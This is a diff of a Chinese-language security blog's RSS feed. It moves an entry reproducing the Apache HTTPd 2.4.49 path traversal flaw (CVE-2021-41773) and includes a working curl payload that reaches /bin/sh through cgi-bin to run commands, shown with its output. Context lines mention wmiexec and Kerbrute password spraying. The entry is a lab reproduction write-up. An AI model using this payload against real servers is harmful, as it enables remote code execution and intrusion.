@@ -30,6 +30,30 @@ python3 wmiexec.py -k -no-pass -dc-ip 192.168.100.242 -debug SV-ERP0001   -dc-ip
     </item>
     
     <item>
+      <title>CVE-2021-41773 Apache HTTPd (2.4.49)</title>
+      <link>/posts/cve-2021-41773-apache-httpd-2.4.49/</link>
+      <pubDate>Sun, 10 Oct 2021 00:00:00 +0000</pubDate>
+      
+      <guid>/posts/cve-2021-41773-apache-httpd-2.4.49/</guid>
+      <description>一、 复现环境 https://github.com/blasty/CVE-2021-41773
+docker-compose build &amp;amp;&amp;amp; docker-compose up -d  二、目录穿越  不能在浏览器复现，会被自动去掉..
+ 三、RCE 前提：
+安装Apache之后，默认并不包含cgi 模块，需要我们自行安装以完成cgi解析，那么有没有可能在启用mod_cgi模块的前提下，实现RCE呢？
+所以前提是启用mod_cgid和mod_cgi模块。
+Linux上的apache实现回显RCE： 在linux上直接可以：
+curl -s --path-as-is -d &#39;echo Content-Type: text/plain; echo; id&#39; &amp;quot;http://localhost:8080/cgi-bin/.%2e/%2e%2e/%2e%2e/bin/sh&amp;quot; uid=33(www-data) gid=33(www-data) groups=33(www-data)  使用burp：
+echo Content-Type: text/plain;echo;id  原理：
+直接执行命令无回显的且报500：
+原因是ap_scan_script_header_err_core_ex函数主要负责从cgi处理结果中读取输入，并确保输出格式符合一定要求。大体来说就是解析后的结果必须符合http协议规范，我们知道http请求分为header和body，且中间需要使用\r\n进行分割。
+也就是说，apache将cgi解析结果作为了http响应包的一部分。
+所以才有了如上构造的payload。
+windows上的RCE Windows版本的Apache通过目录穿越来读取cmd.exe，会提示mallformed header from script，无法实现命令执行。
+但是利用相应的cgi模块可以实现代码执行。
+参考资料 https://mp.weixin.qq.com/s/mx7_wTnU7IWxzeG7e6faTQ
+https://mp.weixin.qq.com/s?__biz=Mzg3MTU0MjkwNw==&amp;amp;mid=2247484889&amp;amp;idx=1&amp;amp;sn=3b3312b592554caa51e1cfcbacd832f0&amp;amp;chksm=cefdbccdf98a35dbf3ab94bb4fa60b63f6e6afd92224744cd496cd59658bee29e6e89cc801de&amp;amp;token=495462423&amp;amp;lang=zh_CN&amp;amp;scene=21#wechat_redirect</description>
+    </item>
+    
+    <item>
       <title>Kerbrute域内用户枚举与密码喷洒</title>
       <link>/posts/kerbrute%E5%9F%9F%E5%86%85%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%E4%B8%8E%E5%AF%86%E7%A0%81%E5%96%B7%E6%B4%92/</link>
       <pubDate>Sun, 10 Oct 2021 00:00:00 +0000</pubDate>
@@ -88,30 +112,6 @@ KRB_AS_REP Roasting
       
       <guid>/docs/example-doc/nested-chapter/chapter-2/</guid>
       <description>&lt;p&gt;This is chapter 2 of nested chapter.&lt;/p&gt;</description>
-    </item>
-    
-    <item>
-      <title></title>
-      <link>/posts/cve-2021-41773-apache-httpd-2.4.49/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/posts/cve-2021-41773-apache-httpd-2.4.49/</guid>
-      <description>一、 复现环境 https://github.com/blasty/CVE-2021-41773
-docker-compose build &amp;amp;&amp;amp; docker-compose up -d  二、目录穿越  不能在浏览器复现，会被自动去掉..
- 三、RCE 前提：
-安装Apache之后，默认并不包含cgi 模块，需要我们自行安装以完成cgi解析，那么有没有可能在启用mod_cgi模块的前提下，实现RCE呢？
-所以前提是启用mod_cgid和mod_cgi模块。
-Linux上的apache实现回显RCE： 在linux上直接可以：
-curl -s --path-as-is -d &#39;echo Content-Type: text/plain; echo; id&#39; &amp;quot;http://localhost:8080/cgi-bin/.%2e/%2e%2e/%2e%2e/bin/sh&amp;quot; uid=33(www-data) gid=33(www-data) groups=33(www-data)  使用burp：
-echo Content-Type: text/plain;echo;id  原理：
-直接执行命令无回显的且报500：
-原因是ap_scan_script_header_err_core_ex函数主要负责从cgi处理结果中读取输入，并确保输出格式符合一定要求。大体来说就是解析后的结果必须符合http协议规范，我们知道http请求分为header和body，且中间需要使用\r\n进行分割。
-也就是说，apache将cgi解析结果作为了http响应包的一部分。
-所以才有了如上构造的payload。
-windows上的RCE Windows版本的Apache通过目录穿越来读取cmd.exe，会提示mallformed header from script，无法实现命令执行。
-但是利用相应的cgi模块可以实现代码执行。
-参考资料 https://mp.weixin.qq.com/s/mx7_wTnU7IWxzeG7e6faTQ
-https://mp.weixin.qq.com/s?__biz=Mzg3MTU0MjkwNw==&amp;amp;mid=2247484889&amp;amp;idx=1&amp;amp;sn=3b3312b592554caa51e1cfcbacd832f0&amp;amp;chksm=cefdbccdf98a35dbf3ab94bb4fa60b63f6e6afd92224744cd496cd59658bee29e6e89cc801de&amp;amp;token=495462423&amp;amp;lang=zh_CN&amp;amp;scene=21#wechat_redirect</description>
     </item>
     
   </channel>
